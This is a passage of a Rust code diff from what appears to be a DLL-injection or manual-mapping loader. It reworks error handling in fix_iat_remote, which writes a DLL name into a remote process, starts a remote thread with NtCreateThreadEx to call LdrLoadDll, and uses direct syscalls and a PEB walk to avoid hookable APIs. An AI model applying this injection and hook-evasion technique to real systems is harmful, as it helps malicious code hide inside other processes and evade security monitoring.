-                                    } else if loaded_remote_base == 0 {
-                                        tracing::warn!(
-                                            "fix_iat_remote: remote LdrLoadDll did not report a loaded base for {}",
-                                            dll_name_str
-                                        );
+                                        let mut loaded_remote_base: usize = 0;
+                                        let mut rd = 0usize;
+                                        let read_s = nt_syscall::syscall!(
+                                            "NtReadVirtualMemory",
+                                            hprocess as u64,
+                                            remote_base_out as u64,
+                                            &mut loaded_remote_base as *mut _ as u64,
+                                            std::mem::size_of::<usize>() as u64,
+                                            &mut rd as *mut _ as u64,
+                                        )
+                                        .unwrap_or(-1);
+                                        if read_s < 0 || rd != std::mem::size_of::<usize>() {
+                                            remote_load_failure = Some(format!(
+                                                "failed to read remote LdrLoadDll base output for {}",
+                                                dll_name_str
+                                            ));
+                                        } else if loaded_remote_base == 0 {
+                                            remote_load_failure = Some(format!(
+                                                "remote LdrLoadDll reported null module base for {}",
+                                                dll_name_str
+                                            ));
+                                        }
+
+                                        pe_resolve::close_handle(h_thread as *mut core::ffi::c_void);
                                     }
-
-                                    pe_resolve::close_handle(h_thread as *mut core::ffi::c_void);
                                 } else {
-                                    tracing::warn!(
-                                        "fix_iat_remote: NtCreateThreadEx for remote LdrLoadDll failed: {:#010x}",
+                                    remote_load_failure = Some(format!(
+                                        "NtCreateThreadEx for remote LdrLoadDll failed: {:#010x}",
                                         status as u32
-                                    );
+                                    ));
                                 }
+                            } else {
+                                remote_load_failure = Some(
+                                    "failed to initialize remote output slot for LdrLoadDll".to_string(),
+                                );
                             }
+                        } else {
+                            remote_load_failure = Some(
+                                "failed to write remote UNICODE_STRING for LdrLoadDll".to_string(),
+                            );
                         }
+                    } else {
+                        remote_load_failure = Some(
+                            "failed to write remote DLL name buffer for LdrLoadDll".to_string(),
+                        );
                     }
                     let mut rb2 = remote_block;
                     let mut rb2_sz: usize = 0; // MEM_RELEASE ignores size
@@ -2275,12 +2677,20 @@ unsafe fn fix_iat_remote(
                         hprocess as u64, &mut rb2 as *mut _ as u64,
                         &mut rb2_sz as *mut _ as u64, NT_MEM_RELEASE as u64,
                     );
+
+                    if let Some(msg) = remote_load_failure {
+                        return Err(anyhow!("fix_iat_remote: {}", msg));
+                    }
+                } else {
+                    return Err(anyhow!(
+                        "fix_iat_remote: failed to allocate remote staging block for LdrLoadDll arguments"
+                    ));
                 }
             } else {
-                tracing::warn!(
-                    "fix_iat_remote: NtCreateThreadEx or LdrLoadDll unavailable; skipping remote DLL load for {}",
+                return Err(anyhow!(
+                    "fix_iat_remote: NtCreateThreadEx or LdrLoadDll unavailable for deferred DLL load ({})",
                     dll_name_str
-                );
+                ));
             }
             // Now load locally — use LdrLoadDll resolved via PEB walk (M-26)
             // instead of the hookable LoadLibraryA IAT entry.
